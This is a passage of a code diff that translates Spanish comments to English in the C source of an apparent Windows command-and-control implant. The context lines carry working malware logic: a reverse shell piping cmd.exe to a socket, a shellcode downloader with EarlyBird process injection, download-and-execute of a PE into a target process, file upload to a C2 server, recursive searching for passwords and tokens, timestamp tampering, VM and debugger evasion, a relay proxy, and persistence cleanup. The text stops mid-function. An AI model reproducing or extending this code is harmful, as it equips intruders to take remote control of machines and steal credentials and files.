@@ -1351,12 +1351,12 @@ BOOL load_lazyconf() {
                           SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
             if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
-                printf("[-] Error configurando flags SSL (ignorando)\n");
+                printf("[-] Error setting SSL flags (ignoring)\n");
                 fflush(stdout);
             }
         }
 
-        // No hay headers ni datos
+        // No headers or data
         BOOL sent = WinHttpSendRequest(
             hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -1366,7 +1366,7 @@ BOOL load_lazyconf() {
 
         if (!sent) {
             DWORD error = GetLastError();
-            printf("[-] WinHttpSendRequest falló, Código: %lu\n", error);
+            printf("[-] WinHttpSendRequest failed, Code: %lu\n", error);
             WinHttpCloseHandle(hRequest);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
@@ -1384,7 +1384,7 @@ BOOL load_lazyconf() {
             continue;
         }
 
-        // Obtener código de estado HTTP
+        // Get HTTP status code
         DWORD statusCode = 0;
         DWORD size = sizeof(statusCode);
         WinHttpQueryHeaders(hRequest,
@@ -1393,7 +1393,7 @@ BOOL load_lazyconf() {
         printf("[+] HTTP %lu\n", statusCode);
         fflush(stdout);
 
-        // Leer respuesta
+        // Read response
         char* response = NULL;
         DWORD totalSize = 0;
         DWORD bytesRead;
@@ -1427,9 +1427,9 @@ BOOL load_lazyconf() {
         }
 
         response[totalSize] = '\0';
-        printf("[+] Config descargada (%lu bytes): %.200s\n", totalSize, response);
+        printf("[+] Config downloaded (%lu bytes): %.200s\n", totalSize, response);
 
-        // PARSEAR JSON
+        // PARSE JSON
         cJSON *root = cJSON_Parse(response);
         if (!root) {
             printf("[-] JSON parse error\n");
@@ -1439,7 +1439,7 @@ BOOL load_lazyconf() {
             continue;
         }
 
-        // Extraer valores
+        // Extract values
         cJSON *port_item = cJSON_GetObjectItem(root, "reverse_shell_port");
         if (cJSON_IsNumber(port_item)) {
             lazyconf.reverse_shell_port = port_item->valueint;
@@ -1471,16 +1471,16 @@ BOOL load_lazyconf() {
 
         cJSON_Delete(root);
         free(response);
-        return TRUE; // ÉXITO
+        return TRUE; // SUCCESS
     }
 
-    printf("[-] Todos los intentos de carga de config fallaron\n");
+    printf("[-] All config load attempts failed\n");
     fflush(stdout);
     return FALSE;
 }
 
 HMODULE GetNtdllBase() {
-    printf("[*] Buscando ntdll.dll...\n");
+    printf("[*] Searching for ntdll.dll...\n");
     fflush(stdout);
 
     PEB* peb;
@@ -1507,7 +1507,7 @@ HMODULE GetNtdllBase() {
                 entry->BaseDllName.Buffer[6] == L'd' &&
                 entry->BaseDllName.Buffer[7] == L'l' &&
                 entry->BaseDllName.Buffer[8] == L'l') {
-                printf("[+] ntdll.dll encontrado en: 0x%p\n", entry->DllBase);
+                printf("[+] ntdll.dll found at: 0x%p\n", entry->DllBase);
                 fflush(stdout);
                 return (HMODULE)entry->DllBase;
             }
@@ -1517,12 +1517,12 @@ HMODULE GetNtdllBase() {
 
     HMODULE h = GetModuleHandleA("ntdll.dll");
     if (h) {
-        printf("[+] ntdll.dll obtenido con fallback: 0x%p\n", h);
+        printf("[+] ntdll.dll obtained via fallback: 0x%p\n", h);
         fflush(stdout);
         return h;
     }
 
-    printf("[-] No se pudo encontrar ntdll.dll\n");
+    printf("[-] Could not find ntdll.dll\n");
     fflush(stdout);
     return NULL;
 }
@@ -1535,7 +1535,7 @@ BOOL isVMByMAC() {
     PIP_ADAPTER_INFO adapter = NULL;
     ULONG ulOutBufLen = 0;
 
-    // Obtener tamaño necesario
+    // Get required size
     if (GetAdaptersInfo(adapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
         adapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
         if (!adapterInfo) {
@@ -1545,7 +1545,7 @@ BOOL isVMByMAC() {
         }
     }
 
-    // Obtener información de adaptadores
+    // Get adapter information
     if (GetAdaptersInfo(adapterInfo, &ulOutBufLen) != NO_ERROR) {
         printf("[-] GetAdaptersInfo failed.\n");
         fflush(stdout);
@@ -1553,7 +1553,7 @@ BOOL isVMByMAC() {
         return FALSE;
     }
 
-    // Prefijos de MAC de VMs conocidas
+    // Known VM MAC prefixes
     const char* vmMACPrefixes[] = {
         "00:05:69",  // VMware
         "00:0C:29",  // VMware
@@ -1563,24 +1563,24 @@ BOOL isVMByMAC() {
     };
     int numPrefixes = 5;
 
-    // Recorrer adaptadores
+    // Iterate over adapters
     adapter = adapterInfo;
     while (adapter) {
-        // Saltar interfaces no activas o loopback
+        // Skip inactive or loopback interfaces
         if (adapter->Type != MIB_IF_TYPE_ETHERNET ||
             adapter->AddressLength != 6) {
             adapter = adapter->Next;
             continue;
         }
 
-        // Formatear MAC como string: XX:XX:XX:XX:XX:XX
+        // Format MAC as string: XX:XX:XX:XX:XX:XX
         char mac_str[18];
         snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X",
                  adapter->Address[0],
                  adapter->Address[1],
                  adapter->Address[2]);
 
-        // Comparar con prefijos de VM
+        // Compare against VM prefixes
         for (int i = 0; i < numPrefixes; i++) {
             if (strcmp(mac_str, vmMACPrefixes[i]) == 0) {
                 printf("[+] VM detected: MAC prefix %s\n", mac_str);
@@ -1597,7 +1597,7 @@ BOOL isVMByMAC() {
     return FALSE;
 }
 
-// === EXTRAER SHELLCODE ===
+// === EXTRACT SHELLCODE ===
 int extract_shellcode(const char* input, size_t len, unsigned char** out) {
     *out = NULL;
     unsigned char* sc = malloc(1024);
@@ -1628,7 +1628,7 @@ int extract_shellcode(const char* input, size_t len, unsigned char** out) {
 }
 
 
-// Función para convertir hex a bytes
+// Function to convert hex to bytes
 BYTE hex_char_to_byte(char c) {
     if (c >= '0' && c <= '9') return c - '0';
     if (c >= 'a' && c <= 'f') return c - 'a' + 10;
@@ -1644,7 +1644,7 @@ void hex_to_bytes(const char* hex, BYTE* output, size_t len) {
 
 // === executeLoader ===
 void executeLoader(void *arg){
-    // === 1. Validar y loguear inmediatamente ===
+    // === 1. Validate and log immediately ===
     if (!arg) {
         printf("[-] executeLoader: arg is NULL\n");
         fflush(stdout);
@@ -1655,7 +1655,7 @@ void executeLoader(void *arg){
     printf("[*] executeLoader started for: %s\n", url);
     fflush(stdout);
 
-    // === 2. Descargar ===
+    // === 2. Download ===
     DWORD fileSize = 0;
     unsigned char* raw_content = DownloadToBuffer(url, &fileSize);
     if (!raw_content || fileSize == 0) {
@@ -1668,7 +1668,7 @@ void executeLoader(void *arg){
     printf("[+] executeLoader: Downloaded %lu bytes\n", fileSize);
     fflush(stdout);
 
-    // === 3. Extraer shellcode ===
+    // === 3. Extract shellcode ===
     unsigned char* shellcode = NULL;
     int shellcode_len = extract_shellcode((char*)raw_content, fileSize, &shellcode);
     free(raw_content);
@@ -1683,7 +1683,7 @@ void executeLoader(void *arg){
     printf("[+] executeLoader: Shellcode extracted: %d bytes\n", shellcode_len);
     fflush(stdout);
 
-    // === 4. Inyectar ===
+    // === 4. Inject ===
     if (!EarlyBirdInject(shellcode, shellcode_len)) {
         printf("[-] executeLoader: EarlyBirdInject failed\n");
     } else {
@@ -1691,13 +1691,13 @@ void executeLoader(void *arg){
     }
     fflush(stdout);
 
-    // === 5. Limpiar ===
+    // === 5. Clean up ===
     free(shellcode);
     free(arg);
 }
 
 // ========================
-// FUNCIÓN DE INYECCIÓN DE SHELL 
+// SHELL INJECTION FUNCTION 
 // ========================
 void __cdecl ReverseShell(void* arg) {
     ReverseArgs* args = (ReverseArgs*)arg;
@@ -1713,9 +1713,9 @@ void __cdecl ReverseShell(void* arg) {
     strncpy(ip, args->host, 31);
     ip[31] = '\0';
     printf("[D] ReverseShell: Using IP=%s, PORT=%d\n", ip, port);
-    free(args);  // Liberar inmediatamente
+    free(args);  // Free immediately
 
-    // === Inicializar Winsock ===
+    // === Initialize Winsock ===
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
         printf("[D] ReverseShell: WSAStartup failed\n");
@@ -1748,7 +1748,7 @@ void __cdecl ReverseShell(void* arg) {
     }
     printf("[+] ReverseShell: Connected to %s:%d\n", ip, port);
 
-    // === Pipes: entrada y salida del proceso ===
+    // === Pipes: process input and output ===
     SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     HANDLE hInRead = NULL, hInWrite = NULL;
     HANDLE hOutRead = NULL, hOutWrite = NULL;
@@ -1773,7 +1773,7 @@ void __cdecl ReverseShell(void* arg) {
 
     printf("[D] ReverseShell: Pipes created and handles set\n");
 
-    // === Crear proceso: cmd.exe con stdin/stdout redirigidos ===
+    // === Create process: cmd.exe with redirected stdin/stdout ===
     STARTUPINFO si = { sizeof(si) };
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = hInRead;
@@ -1799,7 +1799,7 @@ void __cdecl ReverseShell(void* arg) {
 
     printf("[+] ReverseShell: cmd.exe started with /k, PID=%lu\n", pi.dwProcessId);
 
-    // === Cerrar extremos que el padre no debe usar ===
+    // === Close pipe ends the parent must not use ===
     CloseHandle(hInRead);
     CloseHandle(hOutWrite);
     hInRead = NULL;
@@ -1807,7 +1807,7 @@ void __cdecl ReverseShell(void* arg) {
 
     printf("[D] ReverseShell: Parent pipe ends closed\n");
 
-    // === Hilo para leer salida del proceso (como en el ejemplo que funciona) ===
+    // === Thread to read process output (as in the working example) ===
     DWORD WINAPI ReadFromProcess(LPVOID lpParam) {
         HANDLE hRead = (HANDLE)lpParam;
         char buffer[4096];
@@ -1815,22 +1815,22 @@ void __cdecl ReverseShell(void* arg) {
 
         while (1) {
             if (ReadFile(hRead, buffer, sizeof(buffer), &n, NULL)) {
-                send(s, buffer, n, 0);  // Enviar al socket
+                send(s, buffer, n, 0);  // Send to socket
             } else {
-                break;  // Proceso cerró salida
+                break;  // Process closed its output
             }
         }
         return 0;
     }
 
-    // Lanzar hilo para leer salida del proceso
+    // Launch thread to read process output
     HANDLE hReadThread = CreateThread(NULL, 0, ReadFromProcess, hOutRead, 0, NULL);
     if (hReadThread == NULL) {
         printf("[D] ReverseShell: Failed to create read thread\n");
         goto cleanup;
     }
 
-    // === Bucle principal: leer del socket y escribir al proceso ===
+    // === Main loop: read from socket and write to process ===
     char buffer[4096];
     int r;
     DWORD n;
@@ -1839,7 +1839,7 @@ void __cdecl ReverseShell(void* arg) {
         r = recv(s, buffer, sizeof(buffer), 0);
         if (r <= 0) break;
 
-        // Añadir CRLF si no existe
+        // Append CRLF if missing
         if (r < sizeof(buffer) - 2) {
             if (buffer[r-1] != '\n') {
                 buffer[r] = '\r';
@@ -1912,14 +1912,14 @@ char* GetUsefulSoftware() {
         }
     }
 
-    // Si hay resultados, quita la última coma
+    // If there are results, strip the trailing comma
     if (strlen(result) > 0) {
-        result[strlen(result) - 1] = '\0';  // Quitar última coma
+        result[strlen(result) - 1] = '\0';  // Strip trailing comma
     } else {
         strcpy(result, "none");
     }
 
-    return result;  // Recuerda: el que llama debe hacer free()
+    return result;  // Remember: caller must call free()
 }
 
 char* base64_encode(const unsigned char* data, size_t inputLen) {
@@ -2057,7 +2057,7 @@ void initProxy() {
     }
 }
 
-// Función para reenviar datos entre sockets
+// Function to relay data between sockets
 void WINAPI relay_thread(void* param) {
     SOCKET* sockets = (SOCKET*)param;
     SOCKET from = sockets[0];
@@ -2078,11 +2078,11 @@ void WINAPI relay_thread(void* param) {
     _endthread();
 }
 
-// Tu función proxy_thread usando tus estructuras exactas
+// Your proxy_thread function using your exact structures
 void WINAPI proxy_thread(void* param) {
     ProxyThreadData* data = (ProxyThreadData*)param;
     
-    // Conectar al servidor destino
+    // Connect to the target server
     SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (server == INVALID_SOCKET) {
         goto cleanup;
@@ -2099,7 +2099,7 @@ void WINAPI proxy_thread(void* param) {
         goto cleanup;
     }
     
-    // Actualizar tu ProxySession original
+    // Update your original ProxySession
     if (data->session) {
         EnterCriticalSection(&proxyMutex);
         data->session->server = server;
@@ -2110,7 +2110,7 @@ void WINAPI proxy_thread(void* param) {
            data->listenIP, data->listenPort, 
            data->targetIP, data->targetPort);
     
-    // Crear threads para reenvío bidireccional
+    // Create threads for bidirectional relaying
     SOCKET* relay1 = (SOCKET*)malloc(2 * sizeof(SOCKET));
     SOCKET* relay2 = (SOCKET*)malloc(2 * sizeof(SOCKET));
     
@@ -2128,7 +2128,7 @@ void WINAPI proxy_thread(void* param) {
     }
     
 cleanup:
-    // Limpiar usando tu estructura ProxySession
+    // Clean up using your ProxySession structure
     if (data->session) {
         EnterCriticalSection(&proxyMutex);
         data->session->active = FALSE;
@@ -2149,7 +2149,7 @@ cleanup:
     _endthread();
 }
 
-// Thread para aceptar conexiones
+// Thread to accept connections
 void WINAPI proxy_accept_thread(void* param) {
     ProxyListener* listener = (ProxyListener*)param;
     
@@ -2165,7 +2165,7 @@ void WINAPI proxy_accept_thread(void* param) {
             continue;
         }
         
-        // Buscar slot libre en proxySessions (tu array original)
+        // Find a free slot in proxySessions (your original array)
         EnterCriticalSection(&proxyMutex);
         
         ProxySession* session = NULL;
@@ -2177,7 +2177,7 @@ void WINAPI proxy_accept_thread(void* param) {
         }
         
         if (session) {
-            // Usar tu estructura ProxySession exacta
+            // Use your exact ProxySession structure
             session->client = client;
             session->server = INVALID_SOCKET;
             session->active = TRUE;
@@ -2185,7 +2185,7 @@ void WINAPI proxy_accept_thread(void* param) {
             session->listenIP[sizeof(session->listenIP) - 1] = '\0';
             session->listenPort = listener->listenPort;
             
-            // Crear tu ProxyThreadData exacta
+            // Create your exact ProxyThreadData
             ProxyThreadData* data = (ProxyThreadData*)malloc(sizeof(ProxyThreadData));
             if (data) {
                 data->client = client;
@@ -2197,7 +2197,7 @@ void WINAPI proxy_accept_thread(void* param) {
                 data->targetPort = listener->targetPort;
                 data->session = session;
                 
-                // Usar tu función proxy_thread original
+                // Use your original proxy_thread function
                 _beginthread(proxy_thread, 0, (void*)data);
                 
                 if (numProxySessions < 100) {
@@ -2236,7 +2236,7 @@ BOOL startProxy(const char* listenAddr, const char* targetAddr) {
     
     printf("[*] Starting proxy: %s -> %s\n", listenAddr, targetAddr);
     
-    // Verificar si ya existe
+    // Check if it already exists
     EnterCriticalSection(&proxyMutex);
     for (int i = 0; i < numProxyListeners; i++) {
         if (strcmp(proxyListeners[i].listenIP, listenIP) == 0 && 
@@ -2247,7 +2247,7 @@ BOOL startProxy(const char* listenAddr, const char* targetAddr) {
         }
     }
     
-    // Buscar slot libre para listener
+    // Find a free slot for the listener
     ProxyListener* listener = NULL;
     for (int i = 0; i < 10; i++) {
         if (!proxyListeners[i].running) {
@@ -2262,7 +2262,7 @@ BOOL startProxy(const char* listenAddr, const char* targetAddr) {
     }
     LeaveCriticalSection(&proxyMutex);
     
-    // Crear socket de escucha
+    // Create listening socket
     SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (listenSock == INVALID_SOCKET) {
         return FALSE;
@@ -2282,7 +2282,7 @@ BOOL startProxy(const char* listenAddr, const char* targetAddr) {
         return FALSE;
     }
     
-    // Configurar listener
+    // Configure listener
     EnterCriticalSection(&proxyMutex);
     strncpy(listener->listenIP, listenIP, sizeof(listener->listenIP) - 1);
     listener->listenIP[sizeof(listener->listenIP) - 1] = '\0';
@@ -2293,7 +2293,7 @@ BOOL startProxy(const char* listenAddr, const char* targetAddr) {
     listener->listenSocket = listenSock;
     listener->running = TRUE;
     
-    // CLAVE: Thread separado - NO bloquea
+    // KEY: Separate thread - does NOT block
     _beginthread(proxy_accept_thread, 0, listener);
     
     if (numProxyListeners < 10) {
@@ -2317,7 +2317,7 @@ BOOL stopProxy(const char* listenAddr) {
     
     EnterCriticalSection(&proxyMutex);
     
-    // Buscar y detener listener
+    // Find and stop listener
     BOOL found = FALSE;
     for (int i = 0; i < numProxyListeners; i++) {
         if (proxyListeners[i].running &&
@@ -2334,7 +2334,7 @@ BOOL stopProxy(const char* listenAddr) {
         }
     }
     
-    // Cerrar sesiones usando tu estructura ProxySession original
+    // Close sessions using your original ProxySession structure
     for (int i = 0; i < numProxySessions; i++) {
         if (proxySessions[i].active &&
             strcmp(proxySessions[i].listenIP, ip) == 0 && 
@@ -2388,7 +2388,7 @@ void cleanupProxy() {
     proxyInitialized = FALSE;
 }
 
-// Función simplificada para compresión de directorios
+// Simplified function for directory compression
 BOOL compressDirectory(const char* dirPath) {
     char cmd[1024];
     snprintf(cmd, sizeof(cmd), 
@@ -2398,7 +2398,7 @@ BOOL compressDirectory(const char* dirPath) {
     return system(cmd) == 0;
 }
 
-// Para netconfig
+// For netconfig
 char* getNetworkConfig() {
     return exec_cmd("ipconfig /all");
 }
@@ -2427,7 +2427,7 @@ BOOL UploadFileToC2(const char* url, const char* filePath) {
     const char* filename = strrchr(filePath, '\\');
     filename = filename ? filename + 1 : filePath;
 
-    // Calcular tamaño del cuerpo multipart
+    // Calculate multipart body size
     DWORD bodySize = 0;
     bodySize += strlen("--") + strlen(boundary) + strlen("\r\n");
     bodySize += strlen("Content-Disposition: form-data; name=\"file\"; filename=\"") + strlen(filename) + strlen("\"\r\n");
@@ -2530,7 +2530,7 @@ BOOL UploadFileToC2(const char* url, const char* filePath) {
             WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
         }
 
-        // === Añadir Content-Type multipart ===
+        // === Add multipart Content-Type ===
         char contentType[256];
         snprintf(contentType, sizeof(contentType), "Content-Type: multipart/form-data; boundary=%s", boundary);
         WCHAR wContentType[512];
@@ -2540,7 +2540,7 @@ BOOL UploadFileToC2(const char* url, const char* filePath) {
             break;
         }
 
-        // === Enviar cuerpo multipart ===
+        // === Send multipart body ===
         if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body, bodySize, bodySize, 0)) {
             printf("[-] WinHttpSendRequest failed\n");
             break;
@@ -2574,7 +2574,7 @@ BOOL UploadFileToC2(const char* url, const char* filePath) {
     return result;
 }
 
-// === handleUpload: envía del beacon al C2 ===
+// === handleUpload: sends from beacon to C2 ===
 BOOL handleUpload(const char* command) {
     const char* filePath = command + 7;  // "upload:"
     if (!filePath || !strlen(filePath)) return FALSE;
@@ -2595,7 +2595,7 @@ BOOL handleUpload(const char* command) {
     return FALSE;
 }
 
-// Función para verificar si un archivo existe
+// Function to check whether a file exists
 BOOL FileExistsA(const char* filePath) {
     return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
 }
@@ -2611,7 +2611,7 @@ void selfDestruct() {
         return;
     }
     
-    // Eliminar del registro
+    // Delete from registry
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, 
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
@@ -2620,10 +2620,10 @@ void selfDestruct() {
         RegCloseKey(hKey);
     }
     
-    // Eliminar tarea programada
+    // Delete scheduled task
     system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");
     
-    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
+    // Prepare robust PowerShell command, ESCAPED FOR BASH
     char cmd[2048];
     snprintf(cmd, sizeof(cmd),
         "cmd.exe /c "
@@ -2724,7 +2724,7 @@ char* searchCredentials(const char* basePath) {
     printf("[*] Searching for credentials in: %s\n", basePath);
     fflush(stdout);
 
-    // Validar entrada
+    // Validate input
     if (!basePath || strlen(basePath) == 0) {
         return NULL;
     }
@@ -2742,33 +2742,33 @@ char* searchCredentials(const char* basePath) {
         return NULL;
     }
 
-    // Patrones
+    // Patterns
     const char* patterns[] = {"password", "passwd", "pwd", "secret", "token", "api_key"};
     const int numPatterns = 6;
 
-    // Usamos un buffer grande, pero con control de tamaño
+    // We use a large buffer, but with size control
     char* results = (char*)malloc(8192);
     if (!results) {
         FindClose(hFind);
         return NULL;
     }
     results[0] = '\0';
-    size_t totalLen = 0; // Para evitar strlen en cada strcat
+    size_t totalLen = 0; // To avoid strlen on every strcat
 
     do {
-        // Saltar . y ..
+        // Skip . and ..
         if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
             continue;
         }
 
         char filePath[MAX_PATH];
         if (strlen(basePath) + strlen(ffd.cFileName) + 2 >= MAX_PATH) {
-            continue; // Path demasiado largo
+            continue; // Path too long
         }
         snprintf(filePath, sizeof(filePath), "%s\\%s", basePath, ffd.cFileName);
 
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // Recursión controlada (evitar profundidad infinita)
+            // Controlled recursion (avoid infinite depth)
             char* subResults = searchCredentials(filePath);
             if (subResults) {
                 size_t subLen = strlen(subResults);
@@ -2787,7 +2787,7 @@ char* searchCredentials(const char* basePath) {
                 free(subResults);
             }
         } else {
-            // Verificar si es archivo sensible
+            // Check whether it is a sensitive file
             if (!isSensitiveFile(ffd.cFileName)) {
                 continue;
             }
@@ -2797,7 +2797,7 @@ char* searchCredentials(const char* basePath) {
 
             char line[1024];
             while (fgets(line, sizeof(line), file)) {
-                // Asegurarnos de que line es string válido
+                // Make sure line is a valid string
                 char* newline = strchr(line, '\n');
                 if (newline) *newline = '\0';
 
@@ -2826,7 +2826,7 @@ char* searchCredentials(const char* basePath) {
                     }
                 }
                 if (matched && totalLen >= 8192 - 100) {
-                    // Casi lleno, no sigas
+                    // Almost full, stop here
                     break;
                 }
             }
@@ -2836,7 +2836,7 @@ char* searchCredentials(const char* basePath) {
 
     FindClose(hFind);
 
-    // Retornar solo si hay resultados
+    // Return only if there are results
     if (totalLen == 0) {
         free(results);
         return NULL;
@@ -2848,7 +2848,7 @@ char* searchCredentials(const char* basePath) {
 
 
 
-// Ofusca los timestamps de un archivo
+// Obfuscates a file's timestamps
 BOOL obfuscateFileTimestamp(const char* filepath) {
     printf("[*] ofuscateFileTimestamp...\n");
     fflush(stdout);
@@ -2864,11 +2864,11 @@ BOOL obfuscateFileTimestamp(const char* filepath) {
         return FALSE;
     }
 
-    // Obtener la hora actual
+    // Get current time
     FILETIME ftNow;
     GetSystemTimeAsFileTime(&ftNow);
 
-    // Modificar mtime y atime
+    // Modify mtime and atime
     if (!SetFileTime(hFile, NULL, &ftNow, &ftNow)) {
         CloseHandle(hFile);
         return FALSE;
@@ -2878,10 +2878,10 @@ BOOL obfuscateFileTimestamp(const char* filepath) {
     return TRUE;
 }
 
-// Recorre directorios buscando archivos sensibles
+// Walk directories searching for sensitive files
 void obfuscateFileTimestamps(const char* basePath, int depth) {
-    // Evitar recursión muy profunda
-    if (depth > 10) return;  // Límite razonable
+    // Avoid very deep recursion
+    if (depth > 10) return;  // Reasonable limit
 
     printf("[*] Obfuscating file timestamps in: %s (depth: %d)\n", basePath, depth);
     fflush(stdout);
@@ -2910,7 +2910,7 @@ void obfuscateFileTimestamps(const char* basePath, int depth) {
         snprintf(filepath, sizeof(filepath), "%s\\%s", basePath, ffd.cFileName);
         
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            obfuscateFileTimestamps(filepath, depth + 1);  // Incrementar profundidad
+            obfuscateFileTimestamps(filepath, depth + 1);  // Increase depth
         } else {
             if (isSensitiveFile(ffd.cFileName)) {
                 HANDLE hFile = CreateFileA_Unhooked(filepath,
@@ -3001,7 +3001,7 @@ void simulateLegitimateTraffic(void* param) {
             continue;
         }
 
-        // Ignorar errores de certificado
+        // Ignore certificate errors
         DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_UNKNOWN_CA;
@@ -3018,21 +3018,21 @@ void simulateLegitimateTraffic(void* param) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
 
-        Sleep(30000 + rand() % 60000); // 30-90 segundos
+        Sleep(30000 + rand() % 60000); // 30-90 seconds
     }
 }
 
 void restartClient() {
     printf("[*] Restarting client...\n");
     fflush(stdout);
-    // Obtener la ruta del ejecutable actual
+    // Get the current executable path
     char executable[MAX_PATH];
     if (!GetModuleFileNameA(NULL, executable, MAX_PATH)) {
         printf("[-] Failed to get executable path.\n");
         return;
     }
 
-    // Crear un nuevo proceso con el mismo ejecutable
+    // Create a new process with the same executable
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -3052,7 +3052,7 @@ void restartClient() {
         &si,
         &pi
     )) {
-        // Cerrar handles
+        // Close handles
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         printf("[+] New instance started.\n");
@@ -3060,20 +3060,20 @@ void restartClient() {
         printf("[-] Failed to start new instance: %lu\n", GetLastError());
     }
 
-    // Terminar el proceso actual
+    // Terminate the current process
     ExitProcess(0);
 }
 BOOL checkDebuggers() {
     printf("[*] Checking for debuggers...\n");
     fflush(stdout);
 
-    // 1. IsDebuggerPresent (API básica)
+    // 1. IsDebuggerPresent (basic API)
     if (IsDebuggerPresent()) {
         printf("[+] Debugger detected: IsDebuggerPresent()\n");
         return TRUE;
     }
 
-    // 2. Lista de procesos sospechosos (en WCHAR*)
+    // 2. List of suspicious processes (in WCHAR*)
     const WCHAR* debuggers[] = {
         L"ollydbg.exe",
         L"x64dbg.exe",
@@ -3093,7 +3093,7 @@ BOOL checkDebuggers() {
     };
     const int num_debuggers = 15;
 
-    // Tomar snapshot de procesos
+    // Take process snapshot
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
         printf("[-] Failed to create process snapshot.\n");
@@ -3110,7 +3110,7 @@ BOOL checkDebuggers() {
     }
 
     do {
-        // Convertir a minúsculas y comparar con _wcsicmp
+        // Convert to lowercase and compare with _wcsicmp
         for (int i = 0; i < num_debuggers; i++) {
             if (_wcsicmp(pe32.szExeFile, debuggers[i]) == 0) {
                 printf("[+] Debugger process detected: %ls (PID: %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
@@ -3135,10 +3135,10 @@ unsigned char* MapPEToMemory(unsigned char* rawPE, DWORD rawSize, DWORD* mappedS
     unsigned char* image = (unsigned char*)VirtualAlloc(NULL, *mappedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!image) return NULL;
 
-    // Copiar cabeceras
+    // Copy headers
     memcpy(image, rawPE, nt->OptionalHeader.SizeOfHeaders);
 
-    // Copiar secciones
+    // Copy sections
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (section[i].PointerToRawData == 0 || section[i].SizeOfRawData == 0) continue;
@@ -3151,7 +3151,7 @@ unsigned char* MapPEToMemory(unsigned char* rawPE, DWORD rawSize, DWORD* mappedS
 BOOL downloadAndExecute(const char* url, const char* targetProcess) {
     printf("[*] downloadAndExecute: downloading PE from %s\n", url);
 
-    // Descargar el payload
+    // Download the payload
     DWORD payloadSize = 0;
     BYTE* payload = DownloadToBuffer(url, &payloadSize);
     if (!payload || payloadSize == 0) {
@@ -3159,15 +3159,15 @@ BOOL downloadAndExecute(const char* url, const char* targetProcess) {
         return FALSE;
     }
 
-    // Validar que es 64-bit (como tenías)
+    // Validate that it is 64-bit (as you had it)
     if (!is_64bit(payload)) {
         printf("[-] Only 64-bit PE supported\n");
         free(payload);
         return FALSE;
     }
 
-    // === Guardar en disco con nombre limpio ===
-    const char* filename = "hellbird.exe";  // Nombre fijo, o extraer de URL
+    // === Save to disk with a clean name ===
+    const char* filename = "hellbird.exe";  // Fixed name, or extract from URL
 
     printf("[*] Saving downloaded payload to: %s\n", filename);
 
@@ -3192,7 +3192,7 @@ BOOL downloadAndExecute(const char* url, const char* targetProcess) {
 
     printf("[+] Payload saved to: %s\n", filename);
 
-    // === Ahora llama a overWrite con el archivo local ===
+    // === Now call overWrite with the local file ===
     overWrite(targetProcess, filename);
 
     return TRUE;
@@ -3208,13 +3208,13 @@ BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
         return FALSE;
     }
     
-    // Extraer IV y ciphertext
+    // Extract IV and ciphertext
     BYTE iv[16];
     memcpy(iv, buffer, 16);
     BYTE* ciphertext = buffer + 16;
     DWORD ciphertext_len = *buffer_len - 16;
     
-    // DEBUG: Mostrar IV y ciphertext extraídos
+    // DEBUG: Show extracted IV and ciphertext
     printf("[D] Extracted IV: ");
     for (int i = 0; i < 16; i++) printf("%02x ", iv[i]);
     printf("\n[D] Ciphertext (%lu bytes): ", ciphertext_len);
@@ -3226,7 +3226,7 @@ BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
         return TRUE;
     }
     
-    // Buffer temporal para plaintext
+    // Temporary buffer for plaintext
     BYTE* plaintext = (BYTE*)malloc(ciphertext_len);
     if (!plaintext) {
         printf("[-] malloc failed for plaintext\n");
@@ -3234,22 +3234,22 @@ BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
         return FALSE;
     }
     
-    // Inicializar contexto AES
+    // Initialize AES context
     struct AES_ctx ctx;
     AES_init_ctx(&ctx, aes_key);
     
-    // CFB 128-bit: procesar en bloques de hasta 16 bytes
+    // CFB 128-bit: process in blocks of up to 16 bytes
     BYTE feedback_register[16];
     memcpy(feedback_register, iv, 16);
     
     DWORD processed = 0;
     while (processed < ciphertext_len) {
-        // Cifrar el feedback register para obtener keystream
+        // Encrypt the feedback register to obtain the keystream
         BYTE keystream[16];
         memcpy(keystream, feedback_register, 16);
         AES_ECB_encrypt(&ctx, keystream);
         
-        // Procesar hasta 16 bytes o lo que quede
+        // Process up to 16 bytes or whatever remains
